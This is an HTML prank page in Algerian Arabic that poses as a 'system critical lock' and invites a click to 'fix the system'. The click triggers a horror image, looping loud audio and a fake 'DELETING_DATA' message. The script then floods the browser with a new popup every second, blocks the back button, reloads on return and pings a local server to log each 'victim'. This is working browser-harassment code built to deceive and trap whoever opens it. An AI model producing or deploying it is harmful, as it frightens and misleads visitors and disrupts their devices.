<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>⚠️ SYSTEM_CRITICAL_LOCK ⚠️</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; display: flex; justify-content: center; align-items: center; }
        #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 999; display: none; }
        #textOverlay { position: fixed; bottom: 10%; left: 50%; transform: translateX(-50%); z-index: 1000; color: #f00; text-align: center; font-family: 'Courier New', monospace; font-weight: bold; background: rgba(0,0,0,0.7); padding: 15px; border: 3px solid #f00; display: none; width: 80%; }
        .blink { animation: blinker 0.1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body onclick="activateVirus()">

    <p id="initialText" style="color: #f00; font-size: 20px;">⚠️ إضغط لإصلاح النظام سواسوة...</p>

    <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
    <div id="textOverlay" class="blink">
        <h1 style="font-size: 25px;">ربي ساهل عليك!</h1>
        <p style="font-size: 16px;">نتا دخلت.. نتا تحمل المسؤولية سواسوة.</p>
        <p style="font-size: 12px; color: #fff;">DELETING_DATA... FREE PALESTINE 🇵🇸</p>
    </div>

    <audio id="sfx" src="tfy-krk.mp3" preload="auto"></audio>

    <script>
        let running = false;
        const audio = document.getElementById('sfx');
        const MY_LINK = window.location.href;

        function activateVirus() {
            if (running) return;
            running = true;
            
            // ميزة التنبيه في Termux سواسوة
            // نبعثو طلب لسيرفر البايثون تاعك (localhost:8080) بلي كاين ضحية سواسوة
            fetch('http://localhost:8080/victim_entry', {mode: 'no-cors'}).catch(() => {});

            // التفعيل سواسوة
            document.getElementById('initialText').style.display = 'none';
            document.getElementById('horrorImg').style.display = 'block';
            document.getElementById('textOverlay').style.display = 'block';
            
            // الصوت مع سكتة 4 ثواني سواسوة
            audio.volume = 1.0;
            audio.play();
            audio.onended = () => { setTimeout(() => { audio.play(); }, 4000); };

            // إغراق المتصفح بالتبويبات سواسوة
            setInterval(() => {
                window.open(MY_LINK, '_blank', 'width=10,height=10');
            }, 1000);
        }

        // إجبارية الدخول سواسوة
        document.addEventListener("visibilitychange", () => {
            if (document.visibilityState === 'visible' && running) {
                location.reload();
            }
        });
        window.onpopstate = () => history.go(1);
    </script>
</body>
</html>
